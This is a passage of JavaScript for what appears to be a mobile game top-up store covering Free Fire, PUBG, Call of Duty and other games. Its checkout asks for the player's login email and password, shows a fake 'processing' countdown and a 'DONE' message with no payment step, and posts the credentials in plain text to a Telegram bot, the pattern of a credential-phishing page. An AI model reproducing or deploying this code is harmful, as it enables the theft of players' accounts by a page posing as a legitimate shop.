        else if (currentGame === "BLOOD STRIKE") rechargeList.innerHTML = bsProducts;
        applyThemeColors();
        refreshProductListPrices(); // apply active currency
        if (rechargeModal) rechargeModal.classList.add('active');
        injectReactiveQuantitySelectors();
    }

    function applyThemeColors() {
        if (!themes[currentGame]) return;
        const color = themes[currentGame].color;
        setTimeout(() => {
            if (rechargeList) {
                rechargeList.querySelectorAll('.recharge-item:not(.membership)').forEach(el => {
                    el.style.borderColor = color;
                });
            }
        }, 10);
    }

    // ==========================================
    // BACK BUTTON from Products → correct modal
    // ==========================================
    if (backToId) {
        backToId.addEventListener('click', () => {
            if (rechargeModal) rechargeModal.classList.remove('active');
            if (currentGame === "FREE FIRE") {
                openFFTypeModal();
            } else {
                resetBasket();
            }
        });
    }

    function openCredentialsModal() {
        if (!credentialsModal || !themes[currentGame]) return;
        const theme = themes[currentGame];

        if (credModalTitle) { credModalTitle.innerText = currentGame; credModalTitle.style.color = theme.color; }
        if (credModalIcon) { credModalIcon.src = theme.icon; credModalIcon.style.borderColor = theme.color; }

        if (currentMethod === "ID") {
            if (idCredSection)  idCredSection.style.display  = "block";
            if (accCredSection) accCredSection.style.display = "none";
            if (idInputSectionBox)  idInputSectionBox.style.borderColor  = theme.color;
            if (idField) idField.value = "";
            validateIdInput();
        } else {
            if (idCredSection)  idCredSection.style.display  = "none";
            if (accCredSection) accCredSection.style.display = "block";
            if (accInputSectionBox) accInputSectionBox.style.borderColor = theme.color;
            if (emailField) emailField.value = "";
            if (passField)  passField.value  = "";
            validateAccInput();
        }

        if (confirmIdBtn && themes[currentGame]) {
            confirmIdBtn.style.background = `linear-gradient(to bottom, ${theme.color}, ${theme.accent})`;
        }
        if (confirmAccBtn && themes[currentGame]) {
            confirmAccBtn.style.background = `linear-gradient(to bottom, ${theme.color}, ${theme.accent})`;
        }

        if (rechargeModal)    rechargeModal.classList.remove('active');
        credentialsModal.classList.add('active');
    }

    if (backFromCreds) {
        backFromCreds.addEventListener('click', () => {
            if (credentialsModal) credentialsModal.classList.remove('active');
            if (rechargeModal)    rechargeModal.classList.add('active');
        });
    }

    // ==========================================
    // INPUT VALIDATION
    // ==========================================
    function validateIdInput() {
        if (!confirmIdBtn) return;
        const valid = idField && idField.value.trim().length > 4;
        confirmIdBtn.disabled = !valid;
        confirmIdBtn.style.cursor = valid ? 'pointer' : 'not-allowed';
        confirmIdBtn.style.opacity = valid ? '1' : '0.5';
    }

    function validateAccInput() {
        if (!confirmAccBtn) return;
        const emailValid = emailField && emailField.value.trim().length > 4;
        const passValid  = passField  && passField.value.trim().length  > 2;
        const valid = emailValid && passValid;
        confirmAccBtn.disabled = !valid;
        confirmAccBtn.style.cursor = valid ? 'pointer' : 'not-allowed';
        confirmAccBtn.style.opacity = valid ? '1' : '0.5';
    }

    if (idField)    idField.addEventListener('input', validateIdInput);
    if (emailField) emailField.addEventListener('input', validateAccInput);
    if (passField)  passField.addEventListener('input', validateAccInput);

    // ==========================================
    // CONFIRM ID → checkout
    // ==========================================
    if (confirmIdBtn) {
        confirmIdBtn.addEventListener('click', () => {
            authenticatedUserMeta.method   = "ID";
            authenticatedUserMeta.rawId    = idField ? idField.value.trim() : "";
            authenticatedUserMeta.email    = "";
            authenticatedUserMeta.password = "";
            if (credentialsModal) credentialsModal.classList.remove('active');
            compileAndOpenCheckoutModal();
        });
    }

    // ==========================================
    // CONFIRM ACC → checkout
    // ==========================================
    if (confirmAccBtn) {
        confirmAccBtn.addEventListener('click', () => {
            authenticatedUserMeta.method   = "ACC";
            authenticatedUserMeta.rawId    = "";
            authenticatedUserMeta.email    = emailField ? emailField.value.trim() : "";
            authenticatedUserMeta.password = passField  ? passField.value.trim()  : "";
            if (credentialsModal) credentialsModal.classList.remove('active');
            compileAndOpenCheckoutModal();
        });
    }

    // ==========================================
    // BASKET / CART
    // ==========================================
    function updateBasketDOMCounters() {
        const totalItemsCount = shoppingBasket.reduce((acc, curr) => acc + curr.quantity, 0);
        document.querySelectorAll('.basket-badge-count, #open-basket-from-products span').forEach(el => {
            el.innerText = totalItemsCount;
        });
        if (floatingBasketTrigger) {
            floatingBasketTrigger.style.display = totalItemsCount > 0 ? 'flex' : 'none';
        }
    }

    // ==========================================
    // RESET BASKET
    // ==========================================
    function resetBasket() {
        shoppingBasket = [];
        authenticatedUserMeta = { method: "", rawId: "", email: "", password: "" };
        updateBasketDOMCounters();
        if (rechargeList) {
            rechargeList.querySelectorAll('.qty-current-val').forEach(el => { el.innerText = '0'; });
        }
    }

    function injectReactiveQuantitySelectors() {
        if (!rechargeList) return;
        rechargeList.querySelectorAll('.recharge-item').forEach(itemNode => {
            const pId    = itemNode.getAttribute('data-id');
            const pName  = itemNode.getAttribute('data-name');
            const pPrice = parseFloat(itemNode.getAttribute('data-price')); // always EGP base
            if (!pId) return;

            const activeCartItem  = shoppingBasket.find(i => i.id === pId);
            const currentQuantity = activeCartItem ? activeCartItem.quantity : 0;

            let qtyContainer = itemNode.querySelector('.product-quantity-selector');
            if (!qtyContainer) {
                qtyContainer = document.createElement('div');
                qtyContainer.className = 'product-quantity-selector';
                qtyContainer.addEventListener('click', (e) => e.stopPropagation());
                itemNode.appendChild(qtyContainer);
            }
            qtyContainer.innerHTML = `
                <button class="qty-mod-btn decrement-val">-</button>
                <span class="qty-current-val">${currentQuantity}</span>
                <button class="qty-mod-btn increment-val">+</button>
            `;
            // Cart always stores EGP price; display conversion happens at render time
            qtyContainer.querySelector('.increment-val').onclick = () => { modifyCartItemQuantity(pId, pName, pPrice, 1); };
            qtyContainer.querySelector('.decrement-val').onclick = () => { modifyCartItemQuantity(pId, pName, pPrice, -1); };
        });
    }

    function modifyCartItemQuantity(id, name, price, step) {
        let idx = shoppingBasket.findIndex(item => item.id === id);
        if (idx > -1) {
            shoppingBasket[idx].quantity += step;
            if (shoppingBasket[idx].quantity <= 0) shoppingBasket.splice(idx, 1);
        } else if (step > 0) {
            shoppingBasket.push({ id, name, price, game: currentGame, method: currentMethod, quantity: 1 });
        }
        updateBasketDOMCounters();
        injectReactiveQuantitySelectors();
    }

    if (openBasketFromProducts) {
        openBasketFromProducts.onclick = () => {
            if (shoppingBasket.length === 0) {
                alert(t('basketEmpty'));
                return;
            }
            openCredentialsModal();
        };
    }

    if (floatingBasketTrigger) {
        floatingBasketTrigger.onclick = () => {
            if (shoppingBasket.length > 0) {
                openCredentialsModal();
            }
        };
    }

    // ==========================================
    // CHECKOUT MODAL — prices shown in active currency
    // ==========================================
    function compileAndOpenCheckoutModal() {
        const basketContainer    = document.getElementById('basket-items-wrapper');
        const totalPriceSumNode  = document.getElementById('basket-total-price-sum');

        if (shoppingBasket.length === 0) {
            alert("Your shopping basket is empty! Add products first.");
            return;
        }

        if (basketContainer) basketContainer.innerHTML = "";
        let accumulatedSumEGP = 0;

        shoppingBasket.forEach(item => {
            const rowTotalEGP = item.price * item.quantity; // item.price is always EGP
            accumulatedSumEGP += rowTotalEGP;
            if (basketContainer) {
                const rowEl = document.createElement('div');
                rowEl.className = 'basket-summary-row';
                rowEl.innerHTML = `
                    <div class="basket-item-info">
                        <div class="basket-item-title">${item.name} (x${item.quantity})</div>
                        <div class="basket-item-meta">Game: ${item.game}</div>
                    </div>
                    <div class="basket-item-cost">${formatPrice(rowTotalEGP)}</div>
                `;
                basketContainer.appendChild(rowEl);
            }
        });

        if (totalPriceSumNode) totalPriceSumNode.innerText = formatPrice(accumulatedSumEGP);
        if (checkoutModal) checkoutModal.classList.add('active');
    }

    if (backToRecharge) {
        backToRecharge.addEventListener('click', () => {
            if (checkoutModal)    checkoutModal.classList.remove('active');
            if (rechargeModal)    rechargeModal.classList.add('active');
        });
    }

    // ==========================================
    // CHECKOUT CONFIRM → TELEGRAM
    // ==========================================
    const checkoutBtn = document.getElementById('checkout-btn');
    if (checkoutBtn) {
        checkoutBtn.addEventListener('click', () => {
            let timerSeconds = 6;
            checkoutBtn.disabled = true;
            checkoutBtn.style.cursor = "not-allowed";
            checkoutBtn.style.background = "#555";
            const intervalLoop = setInterval(() => {
                timerSeconds--;
                if (timerSeconds > 0) {
                    let textDots = ".".repeat(((6 - timerSeconds) % 3) + 1);
                    checkoutBtn.innerText = `processing${textDots}`;
                } else {
                    clearInterval(intervalLoop);
                    executeOrderCompletion();
                }
            }, 1000);
            checkoutBtn.innerText = "processing.";
        });
    }

    function executeOrderCompletion() {
        if (successNotification) successNotification.style.display = "block";
        if (checkoutActionCont) checkoutActionCont.innerHTML = `<div class="done-status-block">✅ DONE</div>`;

        // Telegram message always sends EGP prices (base currency) for clarity
        let productsMessageList = shoppingBasket.map((item, idx) => {
            return `${idx + 1}. 🎮 [${item.game}] - ${item.name} x${item.quantity} -> (${item.price * item.quantity} EGP)`;
        }).join('\n');
        let overallCartTotal = shoppingBasket.reduce((sum, item) => sum + (item.price * item.quantity), 0);

        let userAccessInfoString = "";
        if (authenticatedUserMeta.method === "ID") {
            userAccessInfoString = `🆔 Target Player ID: ${authenticatedUserMeta.rawId}`;
        } else {
            userAccessInfoString = `📧 Login Email: ${authenticatedUserMeta.email}\n🔑 Account Password: ${authenticatedUserMeta.password}`;
        }

        const botPayload = `🛒 NEW MARKET ORDER\n\n${userAccessInfoString}\n\n📦 SELECTED ITEMS:\n${productsMessageList}\n\n💰 TOTAL: ${overallCartTotal} EGP`;
        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: botPayload })
        })
        .then(() => {
            shoppingBasket = [];
            updateBasketDOMCounters();
            setTimeout(() => {
                if (checkoutModal)         checkoutModal.classList.remove('active');
                if (successNotification)   successNotification.style.display = "none";
                if (checkoutActionCont) {
                    checkoutActionCont.innerHTML = `<button id="checkout-btn" class="blue-btn">CONFIRM & COMPLETE CHECKOUT</button>`;
                    const newBtn = document.getElementById('checkout-btn');
                    if (newBtn) {
                        newBtn.addEventListener('click', () => {
                            let t = 6;
                            newBtn.disabled = true;
                            newBtn.style.cursor = "not-allowed";
                            newBtn.style.background = "#555";
                            const lp = setInterval(() => {
                                t--;
                                if (t > 0) { let d = ".".repeat(((6-t)%3)+1); newBtn.innerText = `processing${d}`; }
                                else { clearInterval(lp); executeOrderCompletion(); }
                            }, 1000);
                            newBtn.innerText = "processing.";
                        });
                    }
                }
            }, 20000);
        })
        .catch(err => console.error("Transmission failed:", err));
    }

    // ==========================================
    // GAME CARD CLICK EVENTS
    // ==========================================
    const ffCard = document.querySelector('#home-content-section .ff-card');
    if (ffCard) ffCard.addEventListener('click', () => {
        currentGame = "FREE FIRE";
        openFFTypeModal();
    });

    const pubgCard = document.querySelector('#home-content-section .pubg-card');
    if (pubgCard) pubgCard.addEventListener('click', () => { currentGame = "PUBG"; openProductsDirectly(); });

    const codCard = document.querySelector('#home-content-section .cod-card');
    if (codCard) codCard.addEventListener('click', () => { currentGame = "CALL OF DUTY"; openProductsDirectly(); });

    const fifaCard = document.querySelector('#home-content-section .fifa-card');
    if (fifaCard) fifaCard.addEventListener('click', () => { currentGame = "FIFA MOBILE"; openProductsDirectly(); });

    const pesCard = document.querySelector('#home-content-section .pes-card');
    if (pesCard) pesCard.addEventListener('click', () => { currentGame = "PES MOBILE"; openProductsDirectly(); });

    const bsCard = document.querySelector('#home-content-section .bs-card');
    if (bsCard) bsCard.addEventListener('click', () => { currentGame = "BLOOD STRIKE"; openProductsDirectly(); });

    // ==========================================
    // SUPPORT / FEEDBACK SUBMIT → TELEGRAM
    // ==========================================
    const feedbackSubmitBtn  = document.getElementById('feedback-submit-btn');
    const feedbackTextarea   = document.getElementById('feedback-textarea-field');
    const feedbackInputBox   = document.getElementById('feedback-input-box');
    const feedbackThanksBox  = document.getElementById('feedback-thanks-box');

    if (feedbackSubmitBtn && feedbackTextarea) {
        feedbackSubmitBtn.addEventListener('click', () => {
            const msg = feedbackTextarea.value.trim();
            if (!msg) {
                feedbackTextarea.style.borderColor = '#ff3333';
                feedbackTextarea.focus();
                return;
            }
            feedbackTextarea.style.borderColor = '';

            // Disable button and show sending state
            feedbackSubmitBtn.disabled = true;
            feedbackSubmitBtn.textContent = 'Sending...';
            feedbackSubmitBtn.style.opacity = '0.6';
            feedbackSubmitBtn.style.cursor = 'not-allowed';

            const payload = `💬 FEEDBACK / SUPPORT MESSAGE\n\n${msg}`;
            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    // Success — show thanks box
                    if (feedbackInputBox)  feedbackInputBox.style.display  = 'none';
                    if (feedbackThanksBox) feedbackThanksBox.style.display = 'flex';
                    feedbackTextarea.value = '';
                    // Reset after 5 seconds so user can send another message
                    setTimeout(() => {
                        if (feedbackInputBox)  feedbackInputBox.style.display  = 'block';
                        if (feedbackThanksBox) feedbackThanksBox.style.display = 'none';
                        feedbackSubmitBtn.disabled = false;
                        feedbackSubmitBtn.textContent = 'SUBMIT';
                        feedbackSubmitBtn.style.opacity = '1';
                        feedbackSubmitBtn.style.cursor = 'pointer';
                    }, 5000);
                } else {
                    throw new Error('Telegram API error');
                }
            })
            .catch(() => {
                feedbackSubmitBtn.disabled = false;
                feedbackSubmitBtn.textContent = 'SUBMIT';
                feedbackSubmitBtn.style.opacity = '1';
                feedbackSubmitBtn.style.cursor = 'pointer';
                feedbackTextarea.style.borderColor = '#ff3333';
                alert('Failed to send. Please try again or contact us directly on WhatsApp.');
            });
        });
    }

    // ==========================================
    // CLOSE MODALS BY CLICKING OUTSIDE
    // ==========================================
    window.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal-overlay')) {
            // Don't reset basket when closing currency or language modal
            if (e.target.id === 'currency-modal' || e.target.id === 'language-modal') {
                e.target.classList.remove('active');
                return;
            }
            e.target.classList.remove('active');
            [ffTypeModal, rechargeModal, credentialsModal, checkoutModal].forEach(m => {
                if (m) m.classList.remove('active');
            });
            resetBasket();
        }
    });
});